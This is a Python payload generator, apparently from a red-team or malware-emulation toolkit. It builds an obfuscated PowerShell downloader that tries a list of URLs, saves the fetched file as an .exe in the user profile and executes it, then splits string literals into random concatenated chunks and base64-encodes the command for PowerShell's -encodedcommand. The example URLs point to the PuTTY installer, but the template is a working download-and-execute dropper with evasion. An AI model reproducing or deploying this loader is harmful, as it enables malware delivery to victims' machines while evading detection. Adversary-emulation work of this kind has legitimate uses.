import base64
import re
import random

def get_payloads():
    template = r"$Z9__4_5_=('C8_220');$h__088=new-object Net.WebClient;$N2_0_677=('MyDomain1@MyDomain2@MyDomain3@MyDomain4@MyDomain5').Split('@');$t225521=('I2_58_3');$X__84_1 = ('131');$W_7011=('v0_0_4');$K6__58=$env:userprofile+'\'+$X__84_1+('.exe');foreach($j2296197 in $N2_0_677){try{$h__088.DownloadFile($j2296197, $K6__58);$Z_2400=('J_6_708');If ((Get-Item $K6__58).length -ge 40000) {Invoke-Item $K6__58;$h89671=('u2697401');break;}}catch{}}$V_96__1=('j__42_');"

    MyDomain1 = 'https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe'
    MyDomain2 = 'https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe'
    MyDomain3 = 'https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe'
    MyDomain4 = 'https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe'
    MyDomain5 = 'https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe'

    payload = template.replace("MyDomain1", MyDomain1)
    payload = payload.replace("MyDomain2", MyDomain2)
    payload = payload.replace("MyDomain3", MyDomain3)
    payload = payload.replace("MyDomain4", MyDomain4)
    payload = payload.replace("MyDomain5", MyDomain5)

    string_in_powershell_pattern = re.compile(r'\'[^\']+\'')

    for match in re.findall(string_in_powershell_pattern, payload):
        if len(match) > 3:
            remaining = match
            chunked_list = []
            while len(remaining) > 0:
                this_chunk_size = random.randint(2, 6)
                if this_chunk_size < len(remaining):
                    chunked_list.append(remaining[0:this_chunk_size])
                    remaining = remaining[this_chunk_size:]
                else:
                    chunked_list.append(remaining)
                    remaining = ""
            payload = payload.replace(match, "' + '".join(chunked_list))



    # payloads for this builder are returned as UTF16-LE encoded data that is base64 encoded. This is the format
    # compatible with PowerShell's -encodedcommand input
    encoded_payload = base64.b64encode(bytearray(payload, encoding='UTF-16LE')).decode('UTF-8')

    return [encoded_payload]  # always return a list - limit the list to one entry if you want to choose a specific
                              # payload instead of a random one

#  run this script directly to see what you will return for payloads


if __name__ == '__main__':
    for i in get_payloads():
        print(base64.b64decode(i).decode('UTF-8'))
        print(i)
